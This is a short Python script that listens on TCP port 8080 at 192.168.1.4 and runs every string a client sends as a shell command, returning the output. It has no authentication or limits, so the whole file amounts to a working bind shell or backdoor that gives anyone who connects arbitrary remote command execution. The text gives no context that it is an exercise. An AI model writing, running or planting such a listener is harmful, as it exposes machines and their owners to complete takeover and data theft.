import socket
import subprocess

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('192.168.1.4', 8080))
server.listen(5)

print("waiting")
while True:
    conn, addr = server.accept()

    while True:
        try:
            command = conn.recv(1024)
            obj = subprocess.Popen(
                command.decode('utf-8'),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            stdout = obj.stdout.read()
            stderr = obj.stderr.read()
            conn.send(stdout+stderr)

        except ConnectionResetError:
            break
    conn.close()
# server.close()






